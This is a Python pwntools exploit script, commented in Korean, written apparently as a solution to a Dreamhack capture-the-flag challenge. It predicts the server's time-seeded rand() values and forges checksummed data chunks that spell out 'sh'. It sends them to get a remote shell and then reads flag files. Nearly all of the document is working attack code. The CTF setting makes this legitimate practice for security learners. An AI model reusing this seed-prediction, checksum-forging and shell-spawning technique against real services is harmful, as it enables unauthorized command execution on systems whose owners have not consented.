from pwn import *
import ctypes
import time
import struct

# PRNG 예측을 위해 시스템 libc 로드 (도커/리눅스 환경과 동일한 glibc 기반 동작)
libc = ctypes.CDLL("libc.so.6")

# 리버싱된 커스텀 CRC32 로직
def generate_crc32_table():
    table = []
    for i in range(256):
        crc = i
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ 0xedb88320
            else:
                crc >>= 1
        table.append(crc)
    return table

crc_table = generate_crc32_table()

def custom_crc32(type_val, data):
    if len(data) == 0:
        return type_val
    crc = (~type_val) & 0xFFFFFFFF
    for b in data:
        crc = (crc >> 8) ^ crc_table[(crc ^ b) & 0xFF]
    return (~crc) & 0xFFFFFFFF

def create_chunk(type_val, data_str):
    magic = b"FLAG"
    # C언어 strcmp가 인식할 수 있도록 널 바이트(\x00) 추가
    data_bytes = data_str.encode() + b"\x00"
    size = len(data_bytes)

    # Chunk 구조: Magic(4) + Size(4) + Type(4) + Data(size) + CRC32(4)
    chunk = magic
    chunk += struct.pack("<I", size)
    chunk += struct.pack("<I", type_val)
    chunk += data_bytes

    chksum = custom_crc32(type_val, data_bytes)
    chunk += struct.pack("<I", chksum)

    return chunk

def exploit():
    # 실제 드림핵 문제 서버 주소로 변경
    host = "host3.dreamhack.games"
    port = 14639

    r = remote(host, port)

    # 서버에 연결되는 시점의 시간으로 rand() 시드 설정
    current_time = int(time.time())
    libc.srand(current_time)

    # 's'와 'h'를 위한 두 개의 난수 생성
    r1 = libc.rand()
    r2 = libc.rand()

    if r1 == r2 or r1 == 0 or r2 == 0:
        log.error("Invalid rand() values generated. Run the script again.")
        r.close()
        return

    # DAT_00104020 매핑 테이블에 따라 'sh'를 완성할 문자열 구성
    chunk1 = create_chunk(r1, "sierra")  # 's'
    chunk2 = create_chunk(r2, "hotel")   # 'h'

    # Type (rand 값)의 오름차순으로 정렬하여 Strictly Increasing 조건 우회
    chunks = [(r1, chunk1), (r2, chunk2)]
    chunks.sort(key=lambda x: x[0])

    # 최종 페이로드 조립
    payload_bytes = chunks[0][1] + chunks[1][1]
    payload_hex = payload_bytes.hex().encode()

    # 데이터 전송
    r.recvuntil(b"Length? > ")

    # "%ld " 포맷스트링에 맞게 공백을 포함하여 전송
    payload = str(len(payload_bytes)).encode() + b" " + payload_hex
    r.send(payload)

    log.success("Payload delivered successfully! Entering interactive mode...")

    # 쉘을 획득하면 직접 명령어를 입력하거나, 아래 명령어를 복사해서 붙여넣으세요.
    # cat flag-* | grep -v "fake_flag"

    r.interactive()

if __name__ == "__main__":
    exploit()